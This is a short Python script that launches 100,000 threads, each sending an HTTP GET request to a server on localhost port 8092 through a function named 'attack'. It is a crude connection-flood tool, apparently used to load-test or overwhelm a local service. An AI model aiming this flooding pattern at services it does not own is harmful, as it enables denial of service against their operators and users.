import socket
import threading

HOST = "127.0.0.1"
PORT = 8092

def attack():
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        s.send(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
        s.recv(1024)
        s.close()
    except:
        pass

threads = []
for i in range(100000):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Done")